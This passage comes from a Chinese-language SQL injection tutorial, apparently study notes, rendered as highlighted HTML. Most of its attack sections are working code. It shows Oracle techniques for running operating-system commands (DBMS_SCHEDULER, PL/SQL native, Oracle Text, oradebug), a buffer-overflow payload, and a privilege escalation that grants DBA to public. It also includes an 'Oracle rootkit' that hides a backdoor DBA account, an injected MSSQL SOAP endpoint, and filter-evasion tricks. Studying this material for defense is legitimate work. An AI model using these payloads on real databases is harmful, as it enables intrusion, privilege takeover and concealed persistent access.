string\">''</span><span class=\"token operator\">&lt;&lt;</span><span class=\"token keyword\">ALL</span> FI LES<span class=\"token operator\">&gt;&gt;</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token keyword\">execute</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span>ENABLED<span class=\"token string\">''</span> <span class=\"token keyword\">FROM</span> DUAL<span class=\"token punctuation\">;</span> <span class=\"token keyword\">BEGIN</span> <span class=\"token keyword\">OPEN</span> Cl<span class=\"token punctuation\">;</span> <span class=\"token keyword\">FETCH</span> Cl <span class=\"token keyword\">BULK</span> COLLECT <span class=\"token keyword\">INTO</span> POL<span class=\"token punctuation\">;</span>CLOSECI<span class=\"token punctuation\">;</span>DBMS_JVM_EXP_PERMS<span class=\"token punctuation\">.</span>IMPORT_JVM_PERMS<span class=\"token punctuation\">(</span>POL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n</li>\n<li><p><code>DBMS_SCHEDULER</code></p>\n<p>DBMS_SCHEDULER是Oracle 10g及之后版本中新增的内容，它要求拥有CREATE JOB (10gR1)或 CREATE EXTERNAL JOB(10gR2/11g)权限。自 10.2.0.2 起，不能再以 oracle 用户身 份执行操作系统命令，而要以nobody用户执行：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">--Create a Program for dbms_scheduler</span>\n<span class=\"token keyword\">exec</span> DBMS_SCHEDULER<span class=\"token punctuation\">.</span>create_program<span class=\"token punctuation\">(</span><span class=\"token string\">'RDS2009'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'EXECUTABLE'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'c:\\WINDOWS\\system32\\cmd.exe /c echo Owned &gt;&gt; c:\\rds3.txt'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">TRUE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">--Create, execute, and delete a Job for dbms_scheduler</span>\n<span class=\"token keyword\">exec</span> DBMS_SCHEDULER<span class=\"token punctuation\">.</span>create_job<span class=\"token punctuation\">(</span>job_name <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span><span class=\"token string\">'RDS2009JOB'</span><span class=\"token punctuation\">,</span>program_name <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span><span class=\"token string\">'RDS2009'</span><span class=\"token punctuation\">,</span>start_date <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>repeat_interval <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>end_date <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>enabled <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token boolean\">TRUE</span><span class=\"token punctuation\">,</span>auto_drop <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token boolean\">TRUE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p><code>PL/SQL native</code></p>\n<p>拥有修改数据库服务器上SPNC_COMMANDS文本文件的权限。如果创建了存储过程、函数或包并启用了 PL/SQL native,那么Oracle会执行该文件中的所有内容。</p>\n<p>下列代码使用PL/SQL native为public授予DBA权限。grant命令是一条通常以SYS用户身份执行的INSERT INTO SYSAUTHS$命令。</p>\n<p>本例中，我们创建了一个名为e2.sql且由sqlplus 执行的文本文件，sqlplus命令可通过PL/SQL native来启动：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token operator\">OR</span> <span class=\"token keyword\">REPLACE</span> <span class=\"token keyword\">FUNCTION</span> Fl <span class=\"token keyword\">return</span> number\nauthid <span class=\"token keyword\">current_user</span> <span class=\"token keyword\">as</span>\npragma autonomous_transaction<span class=\"token punctuation\">;</span>\nv_file UTL_FILE<span class=\"token punctuation\">.</span>FILE_TYPE<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">BEGIN</span>\n<span class=\"token keyword\">EXECUTE</span> IMMEDIATE q<span class=\"token string\">'!create directory TX as '</span>C:\\'<span class=\"token operator\">!</span><span class=\"token string\">';\nbegin\n-- grant dba to public;\nDBMS_ADVISOR.CREATE_FILE ('</span><span class=\"token keyword\">insert</span> <span class=\"token keyword\">into</span> sys<span class=\"token punctuation\">.</span>sysauth$ <span class=\"token keyword\">values</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token string\">'||chr(13)||chr(10)||'</span><span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span><span class=\"token string\">','</span>TX<span class=\"token string\">','</span>e2<span class=\"token punctuation\">.</span><span class=\"token keyword\">sql</span><span class=\"token string\">');\nend;\nEXECUTE IMMEDIATE q'</span><span class=\"token operator\">!</span><span class=\"token keyword\">drop</span> directory TX<span class=\"token operator\">!</span><span class=\"token string\">';\nEXECUTE IMMEDIATE q'</span><span class=\"token operator\">!</span><span class=\"token keyword\">create</span> directory T <span class=\"token keyword\">as</span> <span class=\"token string\">'C:\\ORACLE\\ORA101\\PLSQL'</span><span class=\"token operator\">!</span><span class=\"token string\">'; \nutl_file.fremove('</span>T<span class=\"token string\">','</span>spnc_commands<span class=\"token string\">');\nv_file: = utl_file.fopen ('</span>T<span class=\"token string\">','</span>spnc_commancis<span class=\"token string\">','</span>w<span class=\"token string\">');\nutl_file.put_line(v_file,'</span>sqlplus <span class=\"token operator\">/</span> <span class=\"token keyword\">as</span> sysdba <span class=\"token variable\">@c</span>:\\e2<span class=\"token punctuation\">.</span><span class=\"token keyword\">sql</span><span class=\"token string\">'); \nutl_file.fclose(v_file);\nEXECUTE IMMEDIATE q'</span><span class=\"token operator\">!</span><span class=\"token keyword\">drop</span> directory T<span class=\"token operator\">!</span><span class=\"token string\">';\nEXECUTE IMMEDIATE q'</span><span class=\"token operator\">!</span><span class=\"token keyword\">alter</span> <span class=\"token keyword\">session</span> <span class=\"token keyword\">set</span> plsql_compiler_flags<span class=\"token operator\">=</span><span class=\"token string\">'NATIVE'</span><span class=\"token operator\">!</span><span class=\"token string\">'; \nEXECUTE IMMEDIATE q'</span><span class=\"token operator\">!</span><span class=\"token keyword\">alter</span> system <span class=\"token keyword\">set</span> plsql_native_library_dir<span class=\"token operator\">=</span><span class=\"token string\">'C:\\'!'</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">EXECUTE</span> IMMEDIATE q<span class=\"token string\">'!create or replace procedure hl as begin null; \nend;!'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">COMMIT</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">RETURN</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p><code>Oracle Text</code></p>\n<p>Oracle Text也可以执行操作系统命令。通过用户自定义的过滤器(USER_FILTER_PREF), 可以将表的内容传递给用户自定义的过滤器。在下面的例子中，通过一个表将TCL代码传递 给用户自定义的过滤器。</p>\n<p>使用Oracle Text用户自定义的过滤器存在着一个限制。只能从ORACLE_HOME/bin目录执行。例如，oratclsh.exe就可以执行。对于这一限制，可以使用UTL_FILE包将相应的可执行文件复制到ORACLE_HOME/bin目录，以便执行该文件：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">create</span> <span class=\"token keyword\">table</span> t <span class=\"token punctuation\">(</span>id number<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">primary</span> <span class=\"token keyword\">key</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">text</span> varchar2<span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">Begin</span>\nctxsys<span class=\"token punctuation\">.</span>ctx_ddl<span class=\"token punctuation\">.</span>drop_preference<span class=\"token punctuation\">(</span><span class=\"token string\">'USER_FILTER_PREF'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">end</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">/</span>\n<span class=\"token keyword\">begin</span>\nctxsys<span class=\"token punctuation\">.</span>ctx_ddl<span class=\"token punctuation\">.</span>create_preference\n<span class=\"token punctuation\">(</span>\npreference_name <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token string\">'USER_FILTER_PREF'</span><span class=\"token punctuation\">,</span>\nobject_name <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token string\">'USER_FILTER'</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nctxsys<span class=\"token punctuation\">.</span>ctx_ddl<span class=\"token punctuation\">.</span>set_attribute\n<span class=\"token punctuation\">(</span><span class=\"token string\">'USER_FILTER_PREF'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'COMMAND'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'oratclsh.exe'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">end</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">/</span>\n<span class=\"token keyword\">begin</span>\n<span class=\"token keyword\">insert</span> <span class=\"token keyword\">into</span> t <span class=\"token keyword\">values</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\nset f [open \"C:/AHT.txt\" {RDWR CREAT}]\nputs $f \"Your System is not protected!\"\nclose $f\nset f [open [lindex $argv 0] {RDWR CREAT}]\nputs $f \"SUCCESSH\"\nclose $f\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">end</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">/</span>\n<span class=\"token keyword\">drop</span> <span class=\"token keyword\">index</span> user_filter_idx<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">create</span> <span class=\"token keyword\">index</span> user_filter_idx <span class=\"token keyword\">on</span> t <span class=\"token punctuation\">(</span><span class=\"token keyword\">text</span><span class=\"token punctuation\">)</span>\nindextype <span class=\"token operator\">is</span> ctxsys<span class=\"token punctuation\">.</span>context\nparameters <span class=\"token punctuation\">(</span><span class=\"token string\">'FILTER USER_FILTER_PREF'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">select</span> token_text <span class=\"token keyword\">from</span> DR$USER_FILTER_IDX$I<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p><code>Alter System set 事件</code></p>\n<p>Alter System set是一种非公开参数(自Oracle 10g以来)，它可以指定自定义调试器的名称。 在调试事件(debugging event)过程中将执行自定义的调试器，而调试事件则需予以强制实现。 例如：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">alter</span> system <span class=\"token keyword\">set</span> <span class=\"token string\">\"_oradbg_pathname\"</span><span class=\"token operator\">=</span><span class=\"token string\">'/tmp/debug.sh'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p><code>PL/SQL native 9i</code></p>\n<p>自9iR2以来，Oracle提供了将PL/SQL代码转换成C代码的方法。为提高灵活性，Oracle 可以修改make工具的名称(例如，修改成calc.exe或其他可执行文件)。例如：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">alter</span> system <span class=\"token keyword\">set</span> plsql_native_make_utility<span class=\"token operator\">=</span><span class=\"token string\">'cmd.exe /c echo Owned &gt; c:\\ rds.txt &amp;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">alter</span> <span class=\"token keyword\">session</span> <span class=\"token keyword\">set</span> plsql_compiler_flags<span class=\"token operator\">=</span><span class=\"token string\">'NATIVE'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">Create</span> <span class=\"token operator\">or</span> <span class=\"token keyword\">replace</span> <span class=\"token keyword\">procedure</span> rds <span class=\"token keyword\">as</span> <span class=\"token keyword\">begin</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">end</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>缓冲区溢出</p>\n<p>2004 年，Cesar Cerrudo 公布 了关于 Oracle 中 NUMTOYMINTERVA 和 NUMTODSINTERVAL 这两个函数的一种缓冲区溢出漏洞，使用下列漏洞在数据库服务器上运行操作系统命令：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> NUMTOYMINTERVAL <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'AAAAAAAAAABBBBBBBBBBCCCCCCCCCCABCDEFGHIJKLMNOPQR'</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">59</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">79</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">150</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">01</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">141</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">68</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">36</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">80</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">52</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">35</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">01</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">37</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">172</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">33</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">01</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token string\">'echo ARE YOU SURE? &gt;c:\\Unbreakable.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> DUAL<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>自定义应用代码</p>\n<p>在Oracle领域，我们经常使用包含操作系统命令的表，这些命令由连接到数据库的外部程序执行。使用指定的命令更新数据库中这样的条目时，我们经常可以控制系统。检查所有表以寻找包含操作系统命令的列，将命令注入到命令表，等待被执行。</p>\n</li>\n</ul>\n<h5 id=\"以SYSDBA执行代码\"><a href=\"#以SYSDBA执行代码\" class=\"headerlink\" title=\"以SYSDBA执行代码\"></a>以SYSDBA执行代码</h5><p>对于具有SYSDBA权限(比如SYS)的用户来说，使用oradebug(9i R2、10g R2、11g R1或11g R2)调用任意的操作系统命令或DLL/库。以下命令中的空格字符必须使用tab字符来代替：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">sqlplus\tsys<span class=\"token operator\">/</span>pw<span class=\"token variable\">@dbserver</span>\t<span class=\"token keyword\">as</span>\tsysdba\n<span class=\"token keyword\">SQL</span><span class=\"token operator\">&gt;</span>oradebug\tsetmypid\n<span class=\"token keyword\">SQL</span><span class=\"token operator\">&gt;</span>oradebug\t<span class=\"token keyword\">call</span>\tsystem\t<span class=\"token string\">\"/bin/touch\t-f\t/home/oracle/rds.txt\"</span><span class=\"token keyword\">Function</span>\treturned\t<span class=\"token number\">0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"PostgreSQL-5\"><a href=\"#PostgreSQL-5\" class=\"headerlink\" title=\"PostgreSQL\"></a>PostgreSQL</h4><p>执行操作系统命令的方式就是调用用户自定义函数(User-Defined Function, UDF)</p>\n<p>对于存在于本地操作系统之上的共享库，库中将没有magic block声明。我们必须上传具有该声明的我们自己的共享库。在PostgreSQL中，可以将UDF放在PostgreSQL用户具有读/ 写访问权限的任何位置。在Linux/UNIX系统中通常位于/tmp目录，在Windows系统中通常位 于 c:\\windows\\temp 目录。</p>\n<p>要包含magic block,在已经包含了头文件fmgr.h之外，还需要在源文件的其中一个模块(仅能有一个模块)中包含下面的指令：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\"># ifdef PG_MODULE_MAGIC</span>\nPG_MODULE_MAGIC<span class=\"token punctuation\">;</span>\n<span class=\"token comment\"># endif</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"巩固访问\"><a href=\"#巩固访问\" class=\"headerlink\" title=\"巩固访问\"></a>巩固访问</h3><p>Oracle rookkit</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">-- the following code must run as DBA</span>\n<span class=\"token keyword\">SQL</span><span class=\"token operator\">&gt;</span> <span class=\"token keyword\">grant</span> dba <span class=\"token keyword\">to</span> hidden identified <span class=\"token keyword\">by</span> hidden_2009<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- create a user hidden with DBA privileges</span>\n<span class=\"token keyword\">SQL</span><span class=\"token operator\">&gt;</span> <span class=\"token keyword\">select</span> sys<span class=\"token punctuation\">.</span>kupp$<span class=\"token keyword\">proc</span><span class=\"token punctuation\">.</span>disable_multiprocess <span class=\"token keyword\">from</span> dual<span class=\"token punctuation\">;</span> \n<span class=\"token comment\">-- this SELECT statement is needed for newer version of Oracle (10.2.0.5,11.1.0.7, 11.2.0.x) to activate the identity change</span>\n<span class=\"token keyword\">SQL</span><span class=\"token operator\">&gt;</span> <span class=\"token keyword\">exec</span> sys<span class=\"token punctuation\">.</span>kupp$<span class=\"token keyword\">proc</span><span class=\"token punctuation\">.</span>change_user<span class=\"token punctuation\">(</span><span class=\"token string\">'SYS'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token comment\">-- become user SYS </span>\n<span class=\"token comment\">-- change the users record in sys.user$</span>\n<span class=\"token keyword\">SQL</span><span class=\"token operator\">&gt;</span> <span class=\"token keyword\">update</span> sys<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span>$ <span class=\"token keyword\">set</span> tempts<span class=\"token comment\">#=666 where name='HIDDEN';</span>\n<span class=\"token comment\">-- does not show the user HIDDEN</span>\n<span class=\"token keyword\">SQL</span><span class=\"token operator\">&gt;</span> <span class=\"token keyword\">select</span> username <span class=\"token keyword\">from</span> dba_users<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- but the connect works</span>\n<span class=\"token keyword\">SQL</span><span class=\"token operator\">&gt;</span> <span class=\"token keyword\">connect</span> hidden<span class=\"token operator\">/</span>hidden_2009\n\n<span class=\"token comment\">#Oracle使用ALL_USERS和DBA_USERS视图来显示用户列表，这些视图包含了三张表的并集。通过将tempts#(或datats#或type#)设置成不存在的值，可以从并集结果和视图中清除用户：</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token operator\">OR</span> <span class=\"token keyword\">REPLACE</span> <span class=\"token keyword\">FORCE</span> <span class=\"token keyword\">VIEW</span> <span class=\"token string\">\"SYS\"</span><span class=\"token punctuation\">.</span><span class=\"token string\">\"ALL—USERS\"</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"USERNAME\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"USER_ID\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"CREATED\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">AS</span>\n<span class=\"token keyword\">select</span> u<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span> u<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span><span class=\"token comment\">#, u.ctime</span>\n<span class=\"token keyword\">from</span> sys<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span>$ u<span class=\"token punctuation\">,</span> sys<span class=\"token punctuation\">.</span>ts$ dts<span class=\"token punctuation\">,</span> sys<span class=\"token punctuation\">.</span>ts$ tts\n<span class=\"token keyword\">where</span> u<span class=\"token punctuation\">.</span>datats<span class=\"token comment\"># = dts.ts#</span>\n<span class=\"token operator\">and</span> u<span class=\"token punctuation\">.</span>tempts<span class=\"token comment\"># = tts.ts#</span>\n<span class=\"token operator\">and</span> u<span class=\"token punctuation\">.</span><span class=\"token keyword\">type</span><span class=\"token comment\"># = 1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>通过http.sys(管理IIS的同一内核组件)暴露基于SOAP(简单对象访问协议)的Web服务，使用T-SQL命令启用端点上的批处理时，端点会隐式暴露另一种名为sqlbatch的SOAP 方法。sqlbatch方法可以通过SOAP来执行T-SQL语句。</p>\n<p>我们可以发出请求来创建需要的SOAP 端点：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">username<span class=\"token operator\">=</span><span class=\"token string\">' exec('</span><span class=\"token keyword\">CREATE</span> ENDPOINT ep2 STATE<span class=\"token operator\">=</span>STARTED <span class=\"token keyword\">AS</span> HTTP <span class=\"token punctuation\">(</span>AUTHENTICATION <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>INTEGRATED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>PATH <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token operator\">/</span>sp<span class=\"token string\">''</span><span class=\"token punctuation\">,</span>PORTS<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>CLEAR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">FOR</span> SOAP <span class=\"token punctuation\">(</span>BATCHES<span class=\"token operator\">=</span>ENABLED<span class=\"token punctuation\">)</span>'<span class=\"token punctuation\">)</span><span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>上述代码在victim服务器的/sp目录中创建了一个SOAP端点，我们可以在该端点上瞄准 一个SOAP请求（使用嵌入式SQL查询）。</p>\n<h2 id=\"高级话题\"><a href=\"#高级话题\" class=\"headerlink\" title=\"高级话题\"></a>高级话题</h2><h3 id=\"避开输入过滤器\"><a href=\"#避开输入过滤器\" class=\"headerlink\" title=\"避开输入过滤器\"></a>避开输入过滤器</h3><p>Web应用防火墙（WAF）或入侵防御系统（IPS）</p>\n<p>通常会过滤SQL关键词，如select，insert，and等、还有特定字符，如单引号，连接字符、还有空白符</p>\n<h4 id=\"使用大小写变种绕过\"><a href=\"#使用大小写变种绕过\" class=\"headerlink\" title=\"使用大小写变种绕过\"></a>使用大小写变种绕过</h4><p>数据库不区分大小写</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">'uNiOn SeLeCt password FrOm tblUsers WhErE username='' admin'</span><span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"使用SQL注释\"><a href=\"#使用SQL注释\" class=\"headerlink\" title=\"使用SQL注释\"></a>使用SQL注释</h4><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#过滤器</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>stristr<span class=\"token punctuation\">(</span>$<span class=\"token keyword\">value</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'FROM '</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>stristr <span class=\"token punctuation\">(</span>Svalue<span class=\"token punctuation\">,</span> <span class=\"token string\">'UPDATE '</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\nstristr<span class=\"token punctuation\">(</span>$<span class=\"token keyword\">value</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'WHERE '</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>\nstristr <span class=\"token punctuation\">(</span>$<span class=\"token keyword\">value</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'ALTER '</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>\nstristr<span class=\"token punctuation\">(</span>$<span class=\"token keyword\">value</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'SELECT '</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>\nstristr <span class=\"token punctuation\">(</span>$<span class=\"token keyword\">value</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'SHUTDOWN '</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\nstristr <span class=\"token punctuation\">(</span>$<span class=\"token keyword\">value</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'CREATE '</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\nstristr <span class=\"token punctuation\">(</span>$<span class=\"token keyword\">value</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'DROP '</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\nstristr<span class=\"token punctuation\">(</span>$<span class=\"token keyword\">value</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'DELETE FROM '</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>\nstristr<span class=\"token punctuation\">(</span>$<span class=\"token keyword\">value</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'script '</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>\nstristr<span class=\"token punctuation\">(</span>$<span class=\"token keyword\">value</span><span class=\"token punctuation\">,</span><span class=\"token string\">'&lt;&gt;'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>stristr<span class=\"token punctuation\">(</span>$<span class=\"token keyword\">value</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'='</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>\nstristr<span class=\"token punctuation\">(</span>$<span class=\"token keyword\">value</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'SET '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> die <span class=\"token punctuation\">(</span><span class=\"token string\">'Please provide a permitted value for'</span><span class=\"token punctuation\">.</span>$<span class=\"token keyword\">key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" 